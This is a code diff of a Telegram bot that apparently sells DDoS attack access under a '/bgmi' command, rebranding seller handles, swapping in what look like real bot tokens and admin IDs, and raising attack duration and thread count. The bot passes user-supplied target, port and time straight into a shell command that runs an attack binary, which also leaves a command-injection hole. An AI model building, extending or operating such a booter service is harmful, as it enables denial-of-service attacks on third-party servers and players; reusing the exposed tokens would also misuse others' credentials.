@@ -17,13 +17,13 @@ keep_alive()
 
 # insert your Telegram bot token here
 
-bot = telebot.TeleBot('7543592031:AAHnlEqSQg2MC_Dimz8Hi71iMD8GfYrweTM')
+bot = telebot.TeleBot('7442268037:AAE6GC-cGEwxmV2LIKBxS0GZSQ-NhHAfTIE')
 
 
 
 # Admin user IDs
 
-admin_id = ["6704542925"]
+admin_id = ["5092896680"]
 
 
 
@@ -97,7 +97,7 @@ allowed_user_ids = read_users()
 
 def log_command(user_id, target, port, time):
 
-    admin_id = ["6758082727"]
+    admin_id = ["5092896680"]
 
     user_info = bot.get_chat(user_id)
 
@@ -307,7 +307,7 @@ def add_user(message):
 
     else:
 
-        response = "𝒀𝒐𝒖 𝒉𝒂𝒗𝒆 𝒏𝒐𝒕 𝒂𝒄𝒄𝒆𝒔𝒔 𝒚𝒆𝒕 𝒈𝒆𝒕 𝒏𝒐𝒘 𝒂𝒄𝒄𝒆𝒔𝒔 𝒇𝒓𝒐𝒎:- @TMZEROO"
+        response = "𝒀𝒐𝒖 𝒉𝒂𝒗𝒆 𝒏𝒐𝒕 𝒂𝒄𝒄𝒆𝒔𝒔 𝒚𝒆𝒕 𝒈𝒆𝒕 𝒏𝒐𝒘 𝒂𝒄𝒄𝒆𝒔𝒔 𝒇𝒓𝒐𝒎:- @Spatel00705"
 
 
 
@@ -379,7 +379,7 @@ def remove_user(message):
 
     else:
 
-        response = "🔐 𝐤𝐞𝐲 𝐞𝐱𝐩𝐢𝐫𝐞:- @TMZEROO ❤️."
+        response = "🔐 𝐤𝐞𝐲 𝐞𝐱𝐩𝐢𝐫𝐞:- @Spatel00705 ❤️."
 
 
 
@@ -417,7 +417,7 @@ def clear_logs_command(message):
 
     else:
 
-        response = "𝒀𝒐𝒖 𝒉𝒂𝒗𝒆 𝒏𝒐𝒕 𝒂𝒄𝒄𝒆𝒔𝒔 𝒚𝒆𝒕 𝒈𝒆𝒕 𝒏𝒐𝒘 𝒂𝒄𝒄𝒆𝒔𝒔 𝒇𝒓𝒐𝒎:- @nandyadu1c❄."
+        response = "𝒀𝒐𝒖 𝒉𝒂𝒗𝒆 𝒏𝒐𝒕 𝒂𝒄𝒄𝒆𝒔𝒔 𝒚𝒆𝒕 𝒈𝒆𝒕 𝒏𝒐𝒘 𝒂𝒄𝒄𝒆𝒔𝒔 𝒇𝒓𝒐𝒎:- @Spatel00705 ❄."
 
     bot.reply_to(message, response)
 
@@ -455,7 +455,7 @@ def clear_users_command(message):
 
     else:
 
-        response = "𝒀𝒐𝒖 𝒉𝒂𝒗𝒆 𝒏𝒐𝒕 𝒂𝒄𝒄𝒆𝒔𝒔 𝒚𝒆𝒕 𝒈𝒆𝒕 𝒏𝒐𝒘 𝒂𝒄𝒄𝒆𝒔𝒔 𝒇𝒓𝒐𝒎:- @nandyadu1c 🔐."
+        response = "𝒀𝒐𝒖 𝒉𝒂𝒗𝒆 𝒏𝒐𝒕 𝒂𝒄𝒄𝒆𝒔𝒔 𝒚𝒆𝒕 𝒈𝒆𝒕 𝒏𝒐𝒘 𝒂𝒄𝒄𝒆𝒔𝒔 𝒇𝒓𝒐𝒎:- @Spatel00705 🔐."
 
     bot.reply_to(message, response)
 
@@ -505,7 +505,7 @@ def show_all_users(message):
 
     else:
 
-        response = "𝒀𝒐𝒖 𝒉𝒂𝒗𝒆 𝒏𝒐𝒕 𝒂𝒄𝒄𝒆𝒔𝒔 𝒚𝒆𝒕 𝒈𝒆𝒕 𝒏𝒐𝒘 𝒂𝒄𝒄𝒆𝒔𝒔 𝒇𝒓𝒐𝒎:- @nandyadu1c❄."
+        response = "𝒀𝒐𝒖 𝒉𝒂𝒗𝒆 𝒏𝒐𝒕 𝒂𝒄𝒄𝒆𝒔𝒔 𝒚𝒆𝒕 𝒈𝒆𝒕 𝒏𝒐𝒘 𝒂𝒄𝒄𝒆𝒔𝒔 𝒇𝒓𝒐𝒎:- @Spatel00705 ❄."
 
     bot.reply_to(message, response)
 
@@ -541,7 +541,7 @@ def show_recent_logs(message):
 
     else:
 
-        response = "𝒀𝒐𝒖 𝒉𝒂𝒗𝒆 𝒏𝒐𝒕 𝒂𝒄𝒄𝒆𝒔𝒔 𝒚𝒆𝒕 𝒈𝒆𝒕 𝒏𝒐𝒘 𝒂𝒄𝒄𝒆𝒔𝒔 𝒇𝒓𝒐𝒎:- @nandyadu1c❄."
+        response = "𝒀𝒐𝒖 𝒉𝒂𝒗𝒆 𝒏𝒐𝒕 𝒂𝒄𝒄𝒆𝒔𝒔 𝒚𝒆𝒕 𝒈𝒆𝒕 𝒏𝒐𝒘 𝒂𝒄𝒄𝒆𝒔𝒔 𝒇𝒓𝒐𝒎:- @Spatel00705 ❄."
 
         bot.reply_to(message, response)
 
@@ -559,7 +559,7 @@ def start_attack_reply(message, target, port, time):
 
     
 
-    response = f"{username}, 𝐀𝐭𝐭𝐚𝐜𝐤 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐲 𝐒𝐭𝐚𝐫𝐭𝐞𝐝 🤡🖕🏻\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- User of :- @TMZEROO"
+    response = f"{username}, 𝐀𝐭𝐭𝐚𝐜𝐤 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐲 𝐒𝐭𝐚𝐫𝐭𝐞𝐝 🤡🖕🏻\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- User of :- @Spatel00705"
 
     bot.reply_to(message, response)
 
@@ -627,7 +627,7 @@ def handle_bgmi(message):
 
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
 
-                full_command = f"./bgmi {target} {port} {time} 100"
+                full_command = f"./bgmi {target} {port} {time} 600"
 
                 process = subprocess.run(full_command, shell=True)
 
@@ -641,7 +641,7 @@ def handle_bgmi(message):
 
     else:
 
-        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. ᴅᴍ ᴛᴏ ʙᴜʏ ᴀᴄᴄᴇss ᴄʟɪᴄᴋ ʜᴇʀᴇ sᴇᴇ ᴅ-ᴅᴏs /plan 1⃣ ᴅᴀʏ ғʀᴇᴇ ᴛʀɪᴀʟ ᴀʟᴏsᴏ ᴀᴠᴀɪʟᴀʙʟᴇ:- @nandyadu1c / @TMZEROO 🤡")
+        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. ᴅᴍ ᴛᴏ ʙᴜʏ ᴀᴄᴄᴇss ᴄʟɪᴄᴋ ʜᴇʀᴇ sᴇᴇ ᴅ-ᴅᴏs /plan 1⃣ ᴅᴀʏ ғʀᴇᴇ ᴛʀɪᴀʟ ᴀʟᴏsᴏ ᴀᴠᴀɪʟᴀʙʟᴇ:- @Spatel00705 / @Spatel00705 🤡")
 
 
 
@@ -706,9 +706,9 @@ def show_help(message):
 
 
 
-Buy From :- @TMZEROO / @nandyadu1c
+Buy From :- @Spatel00705 / @Spatel00705
 
-Official Channel :- https://t.me/v2ddos
+Official Channel :- not yet 
 '''
 
     for handler in bot.message_handlers:
@@ -742,7 +742,7 @@ def welcome_start(message):
 
 🤖 𝙎𝙩𝙖𝙧𝙩 𝘿-𝘿𝙤𝙨 : /help 
 💥 /info : TO Check Your WHOLE INFO.
-✅ That Was Get Your Access From :- @TMZEROO☠️
+✅ That Was Get Your Access From :- @Spatel00705 ☠️
 
 '''
 
@@ -764,7 +764,7 @@ def welcome_rules(message):
 
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
 
-3. MAKE SURE YOU JOINED https://t.me/v2ddos OTHERWISE NOT WORK
+3. MAKE SURE YOU DM @Spatel00705 OTHERWISE NOT WORK
 
 4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
 
@@ -784,7 +784,7 @@ def welcome_plan(message):
 
 Vip 🌟 :
 
--> Attack Time : 300 (S)
+-> Attack Time : 600 (S)
 
 > After Attack Limit : 10 sec
 
